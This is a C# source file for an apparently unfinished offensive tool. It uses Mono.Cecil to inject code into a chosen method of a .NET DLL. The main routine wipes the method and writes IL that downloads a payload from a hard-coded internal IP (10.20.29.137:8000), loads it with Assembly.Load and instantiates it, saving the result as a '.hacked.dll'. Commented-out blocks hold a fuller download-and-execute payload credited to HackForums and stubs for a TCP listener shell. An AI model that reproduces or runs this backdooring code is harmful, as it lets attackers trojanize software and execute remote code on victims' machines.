using System;
using System.Collections.Generic;
using System.Reflection;
using System.Linq;

//Payload usings
using System.IO;
using System.Net.Sockets;
using System.Net;

using Mono.Cecil;
using Mono.Cecil.Cil;

namespace netrefject
{
    class Worker
    {
        Assembly a = null;
        Dictionary<string, MethodReference> methods = new Dictionary<string, MethodReference>(); 

        public static void syntax()
        {
            Console.WriteLine("Please provide full path to a dll");
        }

        public void HandleInjectionFlow(string filename)
        {
            MethodInfo injectMethod = findInjectionMethod(filename);

            if (injectMethod == null) return;

            //bool injected = injectBadStuff(injectMethod);
            bool injected = false;

            if (injected)
            {
                Console.WriteLine("[SUCCESS]");
            }
            else
                Console.WriteLine("[FAILURE]");
        }

        #region method enum
        private MethodInfo findInjectionMethod(string filename)
        {
            MethodInfo mi = null;

            try
            {
                Assembly origAssy = Assembly.LoadFrom(filename);

                Console.WriteLine("[+] Loading modules");

                Dictionary<int, Module> internalModules = new Dictionary<int, Module>();
                int counter = 1;

                //Enumerate modules
                foreach (Module m in origAssy.GetLoadedModules())
                {
                    internalModules.Add(counter, m);
                    Console.WriteLine("[*] " + counter.ToString() + " " + m.Name);
                    counter++;
                }

                int moduleNumber = -1;
                //User chooses module
                while (!internalModules.ContainsKey(moduleNumber)) {
                    moduleNumber = chooseNumber("Please choose module number for type enumeration");
                }

                Console.WriteLine("[*] Enumerating Module " + internalModules[moduleNumber].FullyQualifiedName);

                Dictionary<int, Type> internalModuleTypes = new Dictionary<int, Type>();
                counter = 1;

                //Enumerate Types on chosen module
                foreach (Type t in internalModules[moduleNumber].GetTypes())
                {
                    internalModuleTypes.Add(counter, t);
                    Console.WriteLine("[*] " + counter.ToString() + " " + t.Name);
                    counter++;
                }

                int classNumber = -1;
                //User chooses type
                while (!internalModuleTypes.ContainsKey(classNumber))
                {
                    classNumber = chooseNumber("Please choose type number for method enumeration");
                }

                Console.WriteLine("[*] Enumerating Type " + internalModuleTypes[classNumber].FullName);

                Dictionary<int, MethodInfo> internalMethods = new Dictionary<int, MethodInfo>();
                counter = 1;

                //Enumerate Methods
                foreach(MethodInfo imi in internalModuleTypes[classNumber].GetRuntimeMethods())
                {
                    internalMethods.Add(counter, imi);
                    Console.WriteLine("[*] " + counter.ToString() + " " + imi.Name);
                    counter++;
                    foreach (ParameterInfo pi in imi.GetParameters())
                    {
                        Console.WriteLine("[*]\t" + pi.Name + ":" + pi.ParameterType.FullName);
                    }
                }

                int methodNumber = -1;
                while (!internalMethods.ContainsKey(methodNumber))
                {
                    methodNumber = chooseNumber("Please choose method number for injection");
                }

                Console.WriteLine("[!!] Will try inject payload into:");
                Console.WriteLine("\tModule:" + internalModules[moduleNumber].FullyQualifiedName);
                Console.WriteLine("\tClass:" + internalModuleTypes[classNumber].FullName);
                Console.WriteLine("\tMethod:" + internalMethods[methodNumber].Name);

                //injectBadStuffLame(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber]);
                injectBadStuff(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber]);
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message + ":" + e.StackTrace);
            }

            return mi;
        }

        private int chooseNumber(string question)
        {
            string numberInput = "";
            int number;

            while (!int.TryParse(numberInput, out number))
            {
                Console.Write("[?] " + question + ":");
                numberInput = Console.ReadLine();
            }

            return number;
        }
        #endregion


        //This is from HackForums by a guy called TheBigDamnGa
        //https://hackforums.net/showthread.php?tid=5924760
        private bool injectBadStuffLame(Module moduleT, Type classT, MethodInfo methodT){
            AssemblyDefinition targetAsm = AssemblyDefinition.ReadAssembly(moduleT.Assembly.Location);
            TypeDefinition targetType = targetAsm.MainModule.Types.FirstOrDefault(e => e.Name == classT.Name);
            MethodDefinition m1 = targetType.Methods.FirstOrDefault(x => x.Name == methodT.Name);

            // Initialize References
            References refs = new References();
            refs.uint8 = targetAsm.MainModule.ImportReference(typeof(byte[]));
            refs.Assembly = targetAsm.MainModule.ImportReference(typeof(Assembly));
            refs.MethodInfo = targetAsm.MainModule.ImportReference(typeof(MethodInfo));
            refs.var = targetAsm.MainModule.ImportReference(typeof(object));
            refs.boolean = targetAsm.MainModule.ImportReference(typeof(bool));
            refs.var_array = targetAsm.MainModule.ImportReference(typeof(object[]));
            refs.int32 = targetAsm.MainModule.ImportReference(typeof(int));
            refs.Exception = targetAsm.MainModule.ImportReference(typeof(Exception));

            refs.WebClientCtor = targetAsm.MainModule.ImportReference(typeof(WebClient).GetConstructor(new Type[] { }));
            refs.WebClient_DownloadData = targetAsm.MainModule.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }));

            refs.Assembly_Load = targetAsm.MainModule.ImportReference(typeof(Assembly).GetMethod("Load", new Type[] { typeof(sbyte[]) }));
            refs.Assembly_getEntryPoint = targetAsm.MainModule.ImportReference(typeof(Assembly).GetMethod("get_EntryPoint", new Type[] { }));
            refs.Assembly_CreateInstance = targetAsm.MainModule.ImportReference(typeof(Assembly).GetMethod("CreateInstance", new Type[] { typeof(string) }));

            refs.MemberInfo_getName = targetAsm.MainModule.ImportReference(typeof(MemberInfo).GetMethod("get_Name", new Type[] { }));

            refs.MethodBase_GetParameters = targetAsm.MainModule.ImportReference(typeof(MethodBase).GetMethod("GetParameters", new Type[] { }));
            refs.MethodBase_Invoke = targetAsm.MainModule.ImportReference(typeof(MethodBase).GetMethod("Invoke", new Type[] { typeof(object), typeof(object[]) }));

            // Insert Variables
            m1.Body.Variables.Insert(0, new VariableDefinition(refs.uint8));
            m1.Body.Variables.Insert(1, new VariableDefinition(refs.Assembly));
            m1.Body.Variables.Insert(2, new VariableDefinition(refs.MethodInfo));
            m1.Body.Variables.Insert(3, new VariableDefinition(refs.var));
            m1.Body.Variables.Insert(4, new VariableDefinition(refs.boolean));
            m1.Body.Variables.Insert(5, new VariableDefinition(refs.var_array));
            m1.Body.Variables.Insert(6, new VariableDefinition(refs.int32));
            m1.Body.Variables.Insert(7, new VariableDefinition(refs.boolean));

            var Var_4 = m1.Body.Variables.ElementAt(4);
            var Var_5 = m1.Body.Variables.ElementAt(5);
            var Var_6 = m1.Body.Variables.ElementAt(6);
            var Var_7 = m1.Body.Variables.ElementAt(7);

            // Instructions
            Instruction NOP_0x48 = Instruction.Create(OpCodes.Nop);
            Instruction NOP_0x88 = Instruction.Create(OpCodes.Nop);
            Instruction NOP_0x5D = Instruction.Create(OpCodes.Nop);
            Instruction POP_0x8B = Instruction.Create(OpCodes.Pop);
            Instruction LDLOC_0x6B = Instruction.Create(OpCodes.Ldloc_S, Var_6);
            Instruction RET_0x90 = Instruction.Create(OpCodes.Ret);

            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));

            ExceptionHandler handler = new ExceptionHandler(ExceptionHandlerType.Catch)
            {
                TryStart = m1.Body.Instructions.ElementAt(1),
                TryEnd = POP_0x8B,
                HandlerStart = POP_0x8B,
                HandlerEnd = RET_0x90,
                CatchType = refs.Exception
            };

            m1.Body.ExceptionHandlers.Add(handler);                

            // Try
            //m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
            /*m1.Body.Instructions.Add(Instruction.Create(OpCodes.Newobj, refs.WebClientCtor));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldstr, "http://10.20.29.137/HELLOWORLD")); // URL_OF_EXE
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Call, refs.WebClient_DownloadData));

            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_0));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_0));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Call, refs.Assembly_Load));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_1));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_1));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.Assembly_getEntryPoint));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_1));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MemberInfo_getName));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.Assembly_CreateInstance));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_3));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_GetParameters));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldlen));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldc_I4_0));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ceq));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_4));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_4));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Brfalse_S, NOP_0x48));

            // If
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_3));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldnull));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_Invoke));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Pop));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Br_S, NOP_0x88));

            // Else
            m1.Body.Instructions.Add(NOP_0x48);
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_GetParameters));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldlen));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Conv_I4));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Newarr, refs.var));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_5));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldc_I4_0));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_6));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Br_S, LDLOC_0x6B));
            m1.Body.Instructions.Add(NOP_0x5D);
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_5));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_6));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldnull));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stelem_Ref));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_6));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldc_I4_1));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Add));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_6));

            // For-Loop
            m1.Body.Instructions.Add(LDLOC_0x6B);
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_GetParameters));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldlen));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Conv_I4));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Clt));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_7));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_7));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Brtrue_S, NOP_0x5D));

            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_3));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_5));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_Invoke));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Pop));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
            m1.Body.Instructions.Add(NOP_0x88);

            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Leave_S, RET_0x90));

            // Catch
            m1.Body.Instructions.Add(POP_0x8B);
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Leave_S, RET_0x90));

            // Return
            m1.Body.Instructions.Add(RET_0x90);*/

            targetAsm.Write(moduleT.Assembly.FullName + ".hacked");

            return new Random(DateTime.Now.Millisecond).Next() > (DateTime.Now.Millisecond/2);
        }

        /// <summary>
        /// Cecil code with thanks from Hopeless
        /// https://stackoverflow.com/questions/46052447/replace-methods-body-with-body-of-another-method-using-mono-cecil
        /// Also
        /// https://stackoverflow.com/questions/24852885/mono-cecil-add-class-with-method-into-assembly
        /// </summary>
        /// <param name="moduleT"></param>
        /// <param name="classT"></param>
        /// <param name="methodT"></param>
        /// <returns></returns>
        private bool injectBadStuff(Module moduleT, Type classT, MethodInfo methodT)
        {

            AssemblyDefinition targetAsm = AssemblyDefinition.ReadAssembly(moduleT.Assembly.Location);
            TypeDefinition targetType = targetAsm.MainModule.Types.FirstOrDefault(e => e.Name == classT.Name);
            MethodDefinition m1 = targetType.Methods.FirstOrDefault(x => x.Name == methodT.Name);

            Console.WriteLine("Instructions Before:" + m1.Body.Instructions.Count.ToString());
            injectShell(m1);

            ILProcessor ilp = m1.Body.GetILProcessor();
            
            Console.WriteLine("Instructions After:" + m1.Body.Instructions.Count.ToString());

            //finally write to another output assembly    
            //targetAsm.MainModule.AssemblyReferences.RemoveAt(1);    
            //targetAsm.MainModule.AssemblyReferences.RemoveAt(1);
            targetAsm.Write(moduleT.Assembly.FullName + ".hacked.dll");

            return true;            

            /*
            See what I did here ? Idea was - you write an evilMethod in this class
            and the code copies it via reflection and injects directly into dll you're backdooring
            doesn't work though, not for calls it seems

            Haven't figured it out - and if I or you do - it'll be much cooler to write evil methods.
            I mean the way above works, but it's much harder - specially if you haven't tested your payload   

            int originaInstructionCount = m1.Body.Instructions.Count;
            
            //for (int i = 0; i < originaInstructionCount; i++)
            //{
            //    if (m1.Body.Instructions[i].OpCode == OpCodes.Ret)
            //    {
                    //Instruction retCall = m1.Body.Instructions[i];
                    Instruction firstCall = m1.Body.Instructions[0];
                    MethodDefinition sourceMethodDefinition = getEvilMethodBody();
                    Instruction[] instructions = sourceMethodDefinition.Body.Instructions.ToArray();

                    int instructionCounter = 0;
                    for (int iI = 0;iI<instructions.Length;iI++)
                    {
                        if (instructions[iI].OpCode.Code != Code.Ret)
                        {
                            //If it's a call, we need to find out which method is called and import that method on the fly
                            if (instructions[iI].OpCode.Code == Code.Call){
                                //var call = ilp.Create (OpCodes.Call, getMethodImportBasedOnOperand(instructions[iI],targetAsm.MainModule).Resolve());
                                var call = ilp.Create (OpCodes.Call, getMethodImportBasedOnOperand(instructions[iI], m1.Module).Resolve());
                                ilp.InsertAfter(m1.Body.Instructions[instructionCounter],call);
                                //ilp.InsertBefore(retCall,hackConsoleWriteLine);
                            }
                            else{
                                ilp.InsertAfter(m1.Body.Instructions[instructionCounter],instructions[iI]);
                            }
                        }
                        instructionCounter++;
                    }
            //    }
            //}

            Console.WriteLine("Instructions After:" + m1.Body.Instructions.Count.ToString());

            //finally write to another output assembly    
            //targetAsm.MainModule.AssemblyReferences.RemoveAt(1);    
            //targetAsm.MainModule.AssemblyReferences.RemoveAt(1);
            targetAsm.Write(moduleT.Assembly.FullName + ".hacked.dll");

            return true;*/
        }

        private void injectShell(MethodDefinition m1){
            ILProcessor ilp = m1.Body.GetILProcessor();
            //int instructionCounter = 0;
            //ilp.InsertBefore (m1.Body.Instructions [instructionCounter], ilp.Create (OpCodes.Ldstr, "INJECTED EVIL"));
            //ilp.InsertAfter (m1.Body.Instructions [instructionCounter], ilp.Create (OpCodes.Call,m1.Module.Import (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
            //instructionCounter++;

            //We're adding code to the end of the method 
            //We could add to the beginning as well, but for now blah
            
            //Remove All code and variables
            m1.Body.Instructions.Clear();
            m1.Body.Variables.Clear();
            m1.Body.ExceptionHandlers.Clear();

            //Used to just remove the ret but I'm not sure if adding variables will fuck shit up so im clear everything now
            //ilp.Remove(m1.Body.Instructions[m1.Body.Instructions.Count-1]);

            // Initialize References
            References refs = new References();
            refs.uint8 = m1.Module.ImportReference(typeof(byte[]));
            refs.Assembly = m1.Module.ImportReference(typeof(Assembly));
            refs.MethodInfo = m1.Module.ImportReference(typeof(MethodInfo));
            refs.var = m1.Module.ImportReference(typeof(object));
            refs.boolean = m1.Module.ImportReference(typeof(bool));
            refs.var_array = m1.Module.ImportReference(typeof(object[]));
            refs.int32 = m1.Module.ImportReference(typeof(int));
            refs.Exception = m1.Module.ImportReference(typeof(Exception));

            refs.WebClientCtor = m1.Module.ImportReference(typeof(WebClient).GetConstructor(new Type[] { }));
            refs.WebClient_DownloadData = m1.Module.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }));

            refs.Assembly_Load = m1.Module.ImportReference(typeof(Assembly).GetMethod("Load", new Type[] { typeof(sbyte[]) }));
            refs.Assembly_getEntryPoint = m1.Module.ImportReference(typeof(Assembly).GetMethod("get_EntryPoint", new Type[] { }));
            refs.Assembly_CreateInstance = m1.Module.ImportReference(typeof(Assembly).GetMethod("CreateInstance", new Type[] { typeof(string) }));

            refs.MemberInfo_getName = m1.Module.ImportReference(typeof(MemberInfo).GetMethod("get_Name", new Type[] { }));

            refs.MethodBase_GetParameters = m1.Module.ImportReference(typeof(MethodBase).GetMethod("GetParameters", new Type[] { }));
            refs.MethodBase_Invoke = m1.Module.ImportReference(typeof(MethodBase).GetMethod("Invoke", new Type[] { typeof(object), typeof(object[]) }));


            m1.Body.InitLocals = true;
            m1.Body.Variables.Add(new VariableDefinition(refs.uint8));
            m1.Body.Variables.Add(new VariableDefinition(refs.var));


            /* Insert Variables
            m1.Body.Variables.Insert(0, new VariableDefinition(refs.uint8));
            m1.Body.Variables.Insert(1, new VariableDefinition(refs.Assembly));
            m1.Body.Variables.Insert(2, new VariableDefinition(refs.MethodInfo));
            m1.Body.Variables.Insert(3, new VariableDefinition(refs.var));
            m1.Body.Variables.Insert(4, new VariableDefinition(refs.boolean));
            m1.Body.Variables.Insert(5, new VariableDefinition(refs.var_array));
            m1.Body.Variables.Insert(6, new VariableDefinition(refs.int32));
            m1.Body.Variables.Insert(7, new VariableDefinition(refs.boolean));

            var Var_4 = m1.Body.Variables.ElementAt(4);
            var Var_5 = m1.Body.Variables.ElementAt(5);
            var Var_6 = m1.Body.Variables.ElementAt(6);
            var Var_7 = m1.Body.Variables.ElementAt(7);

            // Instructions
            Instruction NOP_0x48 = Instruction.Create(OpCodes.Nop);
            Instruction NOP_0x88 = Instruction.Create(OpCodes.Nop);
            Instruction NOP_0x5D = Instruction.Create(OpCodes.Nop);
            Instruction POP_0x8B = Instruction.Create(OpCodes.Pop);
            Instruction LDLOC_0x6B = Instruction.Create(OpCodes.Ldloc_S, Var_6);
            Instruction RET_0x90 = Instruction.Create(OpCodes.Ret);*/

            ilp.Append(Instruction.Create(OpCodes.Nop));

            /*
            ExceptionHandler handler = new ExceptionHandler(ExceptionHandlerType.Catch)
            {
                TryStart = m1.Body.Instructions.ElementAt(1),
                TryEnd = POP_0x8B,
                HandlerStart = POP_0x8B,
                HandlerEnd = RET_0x90,
                CatchType = refs.Exception
            };

            m1.Body.ExceptionHandlers.Add(handler);
            */                
            // Try
            //AssemblyDefinition ad = m1.Module.AssemblyResolver.Resolve(new AssemblyNameReference("System.Net.WebClient",new Version(2,0)));
            //m1.Module.AssemblyReferences.Add(new AssemblyNameReference("System.Net",new Version(2,0)));
            //m1.Module.AssemblyReferences.Add(new AssemblyNameReference("System.Net.WebClient",new Version(2,0)));

            ilp.Append(Instruction.Create(OpCodes.Nop));
            ilp.Append(ilp.Create (OpCodes.Ldstr, "INJECTED EVIL"));
            ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
            ilp.Append(Instruction.Create(OpCodes.Nop));
            ilp.Append(Instruction.Create(OpCodes.Newobj, m1.Module.ImportReference(typeof(WebClient).GetConstructor(new Type[] { }))));
            //ilp.Append(Instruction.Create(OpCodes.Stloc_1));
            //ilp.Append(Instruction.Create(OpCodes.Ldloc_1));

            ilp.Append(Instruction.Create(OpCodes.Ldstr, "http://10.20.29.137:8000/HELLOWORLD"));
            ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }))));
            ilp.Append(Instruction.Create(OpCodes.Stloc_0));
            //Breaks from here down
            ilp.Append(Instruction.Create(OpCodes.Ldloc_0));
            ilp.Append(Instruction.Create(OpCodes.Call, refs.Assembly_Load));
            ilp.Append(Instruction.Create(OpCodes.Ldstr, "testlibrary.Testclass"));
            ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference(typeof(Assembly).GetMethod("CreateInstance", new Type[] { typeof(string) }))));
            ilp.Append(Instruction.Create(OpCodes.Stloc_1));

            ilp.Append(ilp.Create (OpCodes.Ldstr, "Wattefok dit werk nou bra"));
            ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));

            ilp.Append(Instruction.Create(OpCodes.Nop));
            

            //ilp.Append(Instruction.Create(OpCodes.Newobj, m1.Module.ImportReference(typeof(WebClient).GetConstructor(new Type[] { }))));
            //ilp.Append(Instruction.Create(OpCodes.Ldstr, "http://[IP]]/HELLOWORLD")); // URL_OF_EXE
            /*ilp.Append(Instruction.Create(OpCodes.Call, refs.WebClient_DownloadData));
            ilp.Append(Instruction.Create(OpCodes.Stloc_0));
            ilp.Append(Instruction.Create(OpCodes.Ldloc_0));
            ilp.Append(Instruction.Create(OpCodes.Nop));*/

            //Add our new ret
            ilp.Append(ilp.Create(OpCodes.Ret));     

            return;


            /*
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Call, refs.Assembly_Load));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_1));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_1));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.Assembly_getEntryPoint));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_1));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MemberInfo_getName));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.Assembly_CreateInstance));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_3));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_GetParameters));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldlen));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldc_I4_0));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ceq));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_4));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_4));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Brfalse_S, NOP_0x48));

            // If
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_3));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldnull));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_Invoke));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Pop));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Br_S, NOP_0x88));

            // Else
            m1.Body.Instructions.Add(NOP_0x48);
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_GetParameters));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldlen));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Conv_I4));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Newarr, refs.var));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_5));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldc_I4_0));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_6));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Br_S, LDLOC_0x6B));
            m1.Body.Instructions.Add(NOP_0x5D);
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_5));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_6));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldnull));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stelem_Ref));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_6));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldc_I4_1));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Add));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_6));

            // For-Loop
            m1.Body.Instructions.Add(LDLOC_0x6B);
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_GetParameters));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldlen));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Conv_I4));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Clt));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_S, Var_7));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_7));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Brtrue_S, NOP_0x5D));

            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_2));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_3));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_S, Var_5));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Callvirt, refs.MethodBase_Invoke));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Pop));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
            m1.Body.Instructions.Add(NOP_0x88);*/

            //m1.Body.Instructions.Add(Instruction.Create(OpCodes.Leave_S, RET_0x90));

            // Catch
            //m1.Body.Instructions.Add(POP_0x8B);
            //m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
            //m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));
            //m1.Body.Instructions.Add(Instruction.Create(OpCodes.Leave_S, RET_0x90));

            // Return
            //m1.Body.Instructions.Add(RET_0x90);            
        }

        private MethodDefinition getEvilMethodBody()
        {
            AssemblyDefinition sourceAsm = AssemblyDefinition.ReadAssembly(Assembly.GetExecutingAssembly().Location);
            TypeDefinition targetType = sourceAsm.MainModule.Types.FirstOrDefault(e => e.Name == "Worker");
            MethodDefinition m1 = targetType.Methods.FirstOrDefault(x => x.Name == "evilMethod");
            Console.WriteLine("Evil Instruction Count:" + m1.Body.Instructions.Count.ToString());
            return m1;
        }

        private MethodReference getMethodImportBasedOnOperand (Instruction i, ModuleDefinition m1){
            MethodReference md = null;
            if (methods.Count == 0){
                methods = populateMethodReferences(m1);
            }

            md = methods[i.Operand.ToString()];

            return md;
        }

        private Dictionary<string,MethodReference> populateMethodReferences(ModuleDefinition m1){
            Dictionary<string,MethodReference> methodRefs = new Dictionary<string, MethodReference>();
            MethodReference mref = null;

            //Mui Importante: Import all your function references for your evilMethod here
            //mref = m1.ImportReference(typeof(Console).GetMethod("WriteLine",new[] {typeof(object)}));
            mref = m1.ImportReference(typeof(Console).GetMethod("WriteLine",new[] {typeof(string)}));
            methodRefs.Add(mref.ToString(),mref);

            /*
            //TcpListener Constructor
            mref = m1.Module.Import(typeof(TcpListener).GetConstructor(
                new[] {
                    typeof(System.Net.IPAddress),  
                    typeof(int)
                })
            );
            methodRefs.Add(mref.FullName,mref);

            //TcpListener.Start 
            mref = m1.Module.Import(typeof(TcpListener).GetMethod("Start",new[]{typeof(int)}));
            methodRefs.Add(mref.FullName,mref);

            //TcpListener.AcceptTcpClient
            mref=m1.Module.Import(typeof(TcpListener).GetMethod("AcceptTcpClient"));
            methodRefs.Add(mref.FullName,mref);

            //TcpListener.Stop
            mref = m1.Module.Import(typeof(TcpListener).GetMethod("Stop"));
            methodRefs.Add(mref.FullName,mref);

            //TcpClient.GetStream
            mref = m1.Module.Import(typeof(TcpClient).GetMethod("GetStream"));
            methodRefs.Add(mref.FullName,mref);

            //BinaryReader Constructor (NetworkStream)
            mref = m1.Module.Import(typeof(BinaryReader).GetConstructor(
                new []{
                    typeof(NetworkStream)
                })
            );
            methodRefs.Add(mref.FullName,mref);

            //BinaryReader Constructor (MemoryStream)
